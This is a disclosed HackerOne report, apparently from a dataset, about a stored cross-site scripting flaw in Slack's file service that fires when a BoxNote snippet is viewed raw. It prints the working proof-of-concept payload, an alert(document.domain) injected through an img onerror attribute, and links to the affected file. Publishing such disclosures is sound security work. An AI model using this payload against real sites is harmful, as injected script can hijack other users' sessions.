---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '149011'
original_report_id: '149011'
title: a stored xss issue in https://files.slack.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: slack
created_at: '2016-07-03T10:21:45.498Z'
disclosed_at: '2017-06-25T00:03:08.954Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# a stored xss issue in https://files.slack.com

## Metadata

- HackerOne Report ID: 149011
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: slack
- Disclosed At: 2017-06-25T00:03:08.954Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

when making  a BoxNote snippet with this xss payload:
XSS") ;</script> <img src="<img src=search"/onerror=alert(document.domain)//"> "><marquee>

when snippet made: and use the "view raw"  xss payload will be executed

my ex: link where xss payload executed:
https://files.slack.com/files-pri/T027N7MK3-F1NCA92JF/XSS______script___img_src___img_src_search__onerror_alert__Xss__________marquee__boxnote.boxnote

that link will be executed in entire team mate  that could probably used in exploitation.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
